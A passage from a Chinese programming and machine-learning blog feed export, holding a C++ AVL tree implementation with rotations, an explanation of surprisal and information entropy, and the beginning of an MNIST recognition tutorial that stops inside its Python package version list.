class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">K</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">V</span>&gt;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AVLNode</span><br>&#123;<br>AVLNode&lt;K, V&gt;* _left;<br>AVLNode&lt;K, V&gt;* _right;<br>AVLNode&lt;K, V&gt;* _parent;<br><span class="hljs-type">int</span> _bf; <span class="hljs-comment">//平衡因子，记录高度差</span><br>pair&lt;K, V&gt; _kv; <span class="hljs-comment">//存储的一对数据</span><br><span class="hljs-comment">//构造函数</span><br><span class="hljs-built_in">AVLNode</span>(<span class="hljs-type">const</span> pair&lt;K, V&gt;&amp; kv)<br>:_left(<span class="hljs-literal">nullptr</span>)<br>, _right(<span class="hljs-literal">nullptr</span>)<br>, _parent(<span class="hljs-literal">nullptr</span>)<br>, _bf(<span class="hljs-number">0</span>) <span class="hljs-comment">//新增节点肯定是叶子节点，所以高度默认0</span><br>, _kv(kv) &#123;&#125;<br>&#125;;<br><br><br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">K</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">V</span>&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AVLTree</span><br>&#123;<br><span class="hljs-keyword">typedef</span> AVLNode&lt;K, V&gt; Node;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">AVLTree</span>() :_root(<span class="hljs-literal">nullptr</span>)&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">const</span> pair&lt;K,V&gt;&amp; kv)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//如果是第一次插入</span><br><span class="hljs-keyword">if</span> (_root == <span class="hljs-literal">nullptr</span>)<br>&#123;<br>_root = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Node</span>(kv);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>Node* cur = _root; <span class="hljs-comment">//新增节点的插入位置</span><br>Node* parent = <span class="hljs-literal">nullptr</span>; <span class="hljs-comment">//插入位置的父亲节点</span><br><span class="hljs-keyword">while</span> (cur)<br>&#123;<br>parent = cur;<br><span class="hljs-keyword">if</span> (cur-&gt;_kv.first &gt; kv.first)<span class="hljs-comment">//新插节点的值比当前节点小，往左子树找</span><br>cur = cur-&gt;_left;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cur-&gt;_kv.first &lt; kv.first)<br>cur = cur-&gt;_right;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">//不允许插入重复值的节点</span><br>&#125;<br>cur = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Node</span>(kv); <span class="hljs-comment">//创建新节点</span><br>cur-&gt;_parent = parent; <span class="hljs-comment">//连接父亲</span><br><span class="hljs-keyword">if</span> (cur-&gt;_kv.first &gt; parent-&gt;_kv.first)<br>parent-&gt;_right = cur;<br><span class="hljs-keyword">else</span><br>parent-&gt;_left = cur;<br><br><span class="hljs-comment">//节点插入成功，控制平衡因子,父亲为空，则说明调整到根节点了</span><br><span class="hljs-keyword">while</span> (parent)<br>&#123;<br><span class="hljs-keyword">if</span> (cur == parent-&gt;_right) <span class="hljs-comment">//插入节点在父亲节点的右边</span><br>parent-&gt;_bf++; <span class="hljs-comment">//在右边++，在左边--</span><br><span class="hljs-keyword">else</span><br>parent-&gt;_bf--;<br><br><span class="hljs-keyword">if</span> (parent-&gt;_bf == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-comment">//平衡因子为0，说明这棵树之前的平衡因子是-1或者1，也就是说插入新节点后变平衡了</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (parent-&gt;_bf == <span class="hljs-number">1</span> || parent-&gt;_bf == <span class="hljs-number">-1</span>)<br>&#123;<br><span class="hljs-comment">//父亲的平衡因子是1或者-1，说明插入之前是0，也就是说插入之前是平衡的</span><br><span class="hljs-comment">//插入之后高度发生了变化，所以需要继续往上更新平衡因子</span><br>cur = parent;<br>parent = parent-&gt;_parent;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (parent-&gt;_bf == <span class="hljs-number">2</span> || parent-&gt;_bf == <span class="hljs-number">-2</span>)<br>&#123;<br><span class="hljs-comment">//平衡因子为2或者-2，说明这颗树或者子树不平衡了，那么调整这颗树</span><br><span class="hljs-keyword">if</span> (parent-&gt;_bf == <span class="hljs-number">2</span> &amp;&amp; cur-&gt;_bf == <span class="hljs-number">1</span>)<span class="hljs-comment">//右边一边高</span><br><span class="hljs-built_in">RotateL</span>(parent);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (parent-&gt;_bf == <span class="hljs-number">-2</span> &amp;&amp; cur-&gt;_bf == <span class="hljs-number">-1</span>)<span class="hljs-comment">//左边一边高</span><br><span class="hljs-built_in">RotateR</span>(parent);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (parent-&gt;_bf == <span class="hljs-number">-2</span> &amp;&amp; cur-&gt;_bf == <span class="hljs-number">1</span>)<br><span class="hljs-built_in">RotateLR</span>(parent);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (parent-&gt;_bf == <span class="hljs-number">2</span> &amp;&amp; cur-&gt;_bf == <span class="hljs-number">-1</span>)<br><span class="hljs-built_in">RotateRL</span> (parent);<br><br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">assert</span>(<span class="hljs-literal">false</span>);<br>&#125;<br>&#125;<br><span class="hljs-comment">// 左单旋</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RotateL</span><span class="hljs-params">(Node* parent)</span></span><br><span class="hljs-function"></span>&#123;<br>Node* grandparent = parent-&gt;_parent;<br>Node* subR = parent-&gt;_right;<br>Node* subRL = subR-&gt;_left;<br><span class="hljs-comment">//父亲连接subRL</span><br>parent-&gt;_right = subRL;<br><span class="hljs-keyword">if</span> (subRL)<br>subRL-&gt;_parent = parent;<br><br><span class="hljs-comment">//subR的左边连接parent</span><br>subR-&gt;_left = parent;<br>parent-&gt;_parent = subR;<br><span class="hljs-comment">//grandparent连接subR</span><br><span class="hljs-keyword">if</span> (grandparent == <span class="hljs-literal">nullptr</span>)<br>&#123;<br><span class="hljs-comment">//grandparent为空，说明parent一开始是根节点</span><br>_root = subR;<br>subR-&gt;_parent = <span class="hljs-literal">nullptr</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">//如果parent一开是grandparent的左子树，则grandparent的左子树连接subR</span><br><span class="hljs-keyword">if</span> (parent == grandparent-&gt;_left)<br>grandparent-&gt;_left = subR;<br><span class="hljs-keyword">else</span><br>grandparent-&gt;_right = subR;<br>subR-&gt;_parent = grandparent;<br>&#125;<br><span class="hljs-comment">//更新平衡因子</span><br>parent-&gt;_bf = subR-&gt;_bf = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//右单旋</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RotateR</span><span class="hljs-params">(Node* parent)</span></span><br><span class="hljs-function"></span>&#123;<br>Node* subL = parent-&gt;_left;<br>Node* subLR = subL-&gt;_right;<br>Node* grandpraent = parent-&gt;_parent;<br>parent-&gt;_left = subLR;<br><span class="hljs-keyword">if</span> (subLR)<br>subLR-&gt;_parent = parent;<br><br>subL-&gt;_right = parent;<br>parent-&gt;_parent = subL;<br><span class="hljs-keyword">if</span> (grandpraent == <span class="hljs-literal">nullptr</span>)<br>&#123;<br>_root = subL;<br>subL-&gt;_parent = <span class="hljs-literal">nullptr</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">if</span> (grandpraent-&gt;_left == parent)<br>grandpraent-&gt;_left = subL;<br><span class="hljs-keyword">else</span><br>grandpraent-&gt;_right = subL;<br>subL-&gt;_parent = grandpraent;<br>&#125;<br>subL-&gt;_bf = parent-&gt;_bf = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//左右双旋</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RotateLR</span><span class="hljs-params">(Node* parent)</span></span><br><span class="hljs-function"></span>&#123;<br>Node* subL = parent-&gt;_left;<br>Node* subLR = subL-&gt;_right;<br><span class="hljs-type">int</span> lrbf = subLR-&gt;_bf;<br><br><span class="hljs-comment">//先左旋subL</span><br><span class="hljs-built_in">RotateL</span>(subL);<br><span class="hljs-comment">//右旋parent</span><br><span class="hljs-built_in">RotateR</span>(parent);<br><span class="hljs-comment">//保存LR的平衡因子</span><br><span class="hljs-keyword">if</span> (lrbf == <span class="hljs-number">0</span>)<br>&#123;<br>parent-&gt;_bf = subL-&gt;_bf = subLR-&gt;_bf = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (lrbf == <span class="hljs-number">-1</span>)<br>&#123;<br>subL-&gt;_bf = subLR-&gt;_bf = <span class="hljs-number">0</span>;<br>parent-&gt;_bf = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (lrbf == <span class="hljs-number">1</span>)<br>&#123;<br>subL-&gt;_bf = <span class="hljs-number">-1</span>;<br>subLR-&gt;_bf = parent-&gt;_bf = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">assert</span>(<span class="hljs-literal">false</span>);<br>&#125;<br><span class="hljs-comment">//右左双旋</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RotateRL</span><span class="hljs-params">(Node* parent)</span></span><br><span class="hljs-function"></span>&#123;<br>Node* subR = parent-&gt;_right;<br>Node* subRL = subR-&gt;_left;<br><span class="hljs-type">int</span> rlbf = subRL-&gt;_bf;<br><span class="hljs-built_in">RotateR</span>(subR);<br><span class="hljs-built_in">RotateL</span>(parent);<br><span class="hljs-keyword">if</span> (rlbf == <span class="hljs-number">0</span>)<br>&#123;<br>subR-&gt;_bf = subRL-&gt;_bf = parent-&gt;_bf = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rlbf == <span class="hljs-number">-1</span>)<br>&#123;<br>subRL-&gt;_bf = parent-&gt;_bf = <span class="hljs-number">0</span>;<br>subR-&gt;_bf = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rlbf == <span class="hljs-number">1</span>)<br>&#123;<br>parent-&gt;_bf = <span class="hljs-number">-1</span>;<br>subR-&gt;_bf = subRL-&gt;_bf = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">assert</span>(<span class="hljs-literal">false</span>);<br>&#125;<br><br><span class="hljs-comment">//查找</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Find</span><span class="hljs-params">(<span class="hljs-type">const</span> K&amp; k)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (_root == <span class="hljs-literal">nullptr</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>Node* cur = _root;<br><span class="hljs-keyword">while</span> (cur)<br>&#123;<br><span class="hljs-keyword">if</span> (cur-&gt;_kv.first &gt; k)<br>cur = cur-&gt;_left;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cur-&gt;_kv.first &lt; k)<br>cur = cur-&gt;_right;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsBalance</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> _IsBalance(_root);<br>&#125;<br><br><span class="hljs-type">bool</span> _IsBalance(Node* root)<br>&#123;<br><span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br><span class="hljs-type">int</span> LeftHeight = _Height(root-&gt;_left);<br><span class="hljs-type">int</span> RightHeight = _Height(root-&gt;_right);<br><span class="hljs-keyword">if</span> (root-&gt;_bf != RightHeight - LeftHeight)<br>&#123;<br>cout &lt;&lt; root-&gt;_kv.first &lt;&lt; <span class="hljs-string">&quot;现在是平衡因子是:&quot;</span> &lt;&lt; root-&gt;_bf &lt;&lt; endl;<br>cout &lt;&lt; root-&gt;_kv.first &lt;&lt; <span class="hljs-string">&quot;平衡因子应该是:&quot;</span> &lt;&lt; RightHeight - LeftHeight &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>(LeftHeight - RightHeight) &lt; <span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-type">int</span> _Height(Node* root)<br>&#123;<br><span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-type">int</span> leftHeight = _Height(root-&gt;_left);<br><span class="hljs-type">int</span> rightHeight = _Height(root-&gt;_right);<br><span class="hljs-keyword">return</span> leftHeight &gt; rightHeight ? leftHeight + <span class="hljs-number">1</span> : rightHeight + <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">private</span>:<br>Node* _root;<span class="hljs-comment">//AVL树的根</span><br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>C++</category>
      
      <category>面试</category>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>KL散度、交叉熵以及信息熵</title>
    <link href="/project/2023/03/30/KL%E6%95%A3%E5%BA%A6%E3%80%81%E4%BA%A4%E5%8F%89%E7%86%B5%E4%BB%A5%E5%8F%8A%E4%BF%A1%E6%81%AF%E7%86%B5/"/>
    <url>/project/2023/03/30/KL%E6%95%A3%E5%BA%A6%E3%80%81%E4%BA%A4%E5%8F%89%E7%86%B5%E4%BB%A5%E5%8F%8A%E4%BF%A1%E6%81%AF%E7%86%B5/</url>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><p>介绍一下机器学习中常见的数学概念：KL散度、交叉熵、信息熵等</p><span id="more"></span><p>在引入本文主要研究的数学概念前，我们先探究一下惊喜度</p><p>我们用 $p(x)$表示 $x$ 发生的概率。可以暂时先不讨论概率的内涵，我们引入 $\cfrac{1}{p(x)}$可以用来衡量时间$x$发生时会造成的惊喜，我们发现当概率越低的时间发生时，其所造成的惊喜程度越高；概率越高的事件所造成的惊喜程度越低。</p><p>但使用倒数这一运算，其性质不是很好，所以为了不改变单调性的情况下，可以借助$\log$函数来描述，我们将惊喜度（surprisal)定义为：</p><p>$\log{\cfrac{1}{p(x)}} = -\log{p(x)}$</p><p>这样定义后产生了另外两个好处：</p><ul><li>确定性事件的惊喜度数 = 0；</li><li>如果有多个独立事件同时发生，他们产生的惊喜度可以直接相加。</li></ul><p>那么，我们就清楚惊喜度到底是什么，就是一个事件发生的概率的倒数再取对数。</p><h1 id="信息熵-惊喜度的期望"><a href="#信息熵-惊喜度的期望" class="headerlink" title="信息熵 - 惊喜度的期望"></a>信息熵 - 惊喜度的期望</h1><p>惊喜度，在大部分文章里，都叫做信息量，但这个命名只是香农根据他研究对象的需要而做的，对于很多其它的场景，要生搬硬套就会变得非常不好理解了。</p><p>信息量 = 惊喜度，那么信息熵呢？看看公式不言自明：</p><p>$H_p(X) = -\sum{p(x) \cdot \log(p(x))} $</p><p>或是连续形式</p><p>$H_p(X) = \int{p(x) \cdot \log{\cfrac{1}{p(x)}}dx}$</p><p>这不就是惊喜度的期望吗？换句话说，</p><p>信息熵描述的是整个事件空间会产生的平均惊喜。</p><p>什么情况下，平均惊喜度最低呢？确定事件。以某个离散随机分布未例，整个分布在特定值$x_c$为</p><p>1，其他处均为0，此时的信息熵/平均惊喜也为0。</p>]]></content>
    
    
    <categories>
      
      <category>深度学习</category>
      
      <category>统计学基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>统计学</tag>
      
      <tag>深度学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于Pytorch和Opencv实现MNIST手写数字识别</title>
    <link href="/project/2023/03/27/%E5%9F%BA%E4%BA%8ECNN%E5%92%8COpencv%E5%AE%9E%E7%8E%B0MNIST%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E8%AF%86%E5%88%AB/"/>
    <url>/project/2023/03/27/%E5%9F%BA%E4%BA%8ECNN%E5%92%8COpencv%E5%AE%9E%E7%8E%B0MNIST%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E8%AF%86%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>本文 主要使用 Pytorch  和  Opencv 搭建可以识别手写数字的 CNN 模型</p><span id="more"></span><h1 id="1-配置环境"><a href="#1-配置环境" class="headerlink" title="1.配置环境"></a>1.配置环境</h1><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">fairscale</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.4</span>.<span class="hljs-number">13</span><br><br><span class="hljs-attribute">fastjsonschema</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">2.18</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">kiwisolver</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">1.4</span>.<span class="hljs-number">4</span><br><br><span class="hljs-attribute">labml</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.4</span>.<span class="hljs-number">166</span><br><br><span class="hljs-attribute">labml-helpers</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.4</span>.<span class="hljs-number">89</span><br><br><span class="hljs-attribute">labml-nn</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.4</span>.<span class="hljs-number">135</span><br><br>lazy_loader<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.3</span><br><br><span class="hljs-attribute">librosa</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.10</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">llvmlite</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.40</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">mpmath</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">1.3</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">msgpack</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">1.0</span>.<span class="hljs-number">5</span><br><br><span class="hljs-attribute">nbformat</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">5.9</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">networkx</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">3.1</span><br><br><span class="hljs-attribute">numba</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.57</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">numpy</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">1.24</span>.<span class="hljs-number">4</span><br><br><span class="hljs-attribute">opencv-python</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">4.7</span>.<span class="hljs-number">0.72</span><br><br><span class="hljs-attribute">openpyxl</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">3.1</span>.<span class="hljs-number">2</span><br><br><span class="hljs-attribute">pandas</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">2.0</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">Pillow</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">9.4</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">pooch</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">1.7</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">protobuf</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">3.19</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">pyasn1</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.4</span>.<span class="hljs-number">8</span><br><br><span class="hljs-attribute">pyasn1-modules</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.2</span>.<span class="hljs-number">7</span><br><br><span class="hljs-attribute">pyparsing</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">3.0</span>.<span class="hljs-number">9</span><br><br><span class="hljs-attribute">pytz</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">2023.3</span><br><br><span class="hljs-attribute">pywin32</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">305.1</span><br><br><span class="hljs-attribute">PyYAML</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">6.0</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">referencing</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.30</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">rpds-py</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.9</span>.<span class="hljs-number">2</span><br><br><span class="hljs-attribute">scikit-learn</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">1.2</span>.<span class="hljs-number">2</span><br><br><span class="hljs-attribute">scipy</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">1.10</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">seaborn</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.12</span>.<span class="hljs-number">2</span><br><br><span class="hljs-attribute">smmap</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">5.0</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">soundfile</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.12</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">soxr</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.3</span>.<span class="hljs-number">6</span><br><br><span class="hljs-attribute">sympy</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">1.12</span><br><br><span class="hljs-attribute">threadpoolctl</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">3.1</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">torch</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">1.12</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">torch-tb-profiler</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.4</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">torchdata</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.6</span>.<span class="hljs-number">1</span><br><br><span class="hljs-attribute">torchshow</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">0.5</span>.<span class="hljs-number">0</span><br><br><span class="hljs-attribute">torchsummary</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span 